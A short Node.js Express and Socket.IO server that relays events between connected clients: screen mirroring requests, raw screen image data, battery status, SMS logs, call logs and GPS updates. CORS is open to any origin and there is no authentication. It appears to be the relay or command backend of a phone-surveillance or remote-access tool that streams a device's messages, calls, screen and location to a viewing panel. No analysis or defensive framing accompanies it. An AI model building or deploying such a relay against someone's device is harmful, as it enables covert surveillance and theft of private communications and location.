const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

app.use(express.static(path.join(__dirname, 'public')));

io.on('connection', (socket) => {
    // Mirroring relays
    socket.on('request-screen-view', () => socket.broadcast.emit('request-screen-view'));
    socket.on('stop-mirroring', () => socket.broadcast.emit('stop-mirroring'));
    socket.on('screen-status', (status) => socket.broadcast.emit('screen-status', status));
    
    // This is the raw image data relay
    socket.on('screen-data', (data) => socket.broadcast.emit('ui-screen-stream', data));

    // Data Relays
    socket.on('battery-status', (data) => socket.broadcast.emit('ui-battery', data));
    socket.on('sms-data-log', (data) => socket.broadcast.emit('ui-sms-display', data));
    socket.on('call-log-data', (data) => socket.broadcast.emit('ui-calls-display', data));
    socket.on('gps-update', (data) => socket.broadcast.emit('ui-gps', data));
    
    // ...
});
server.listen(process.env.PORT || 3000);





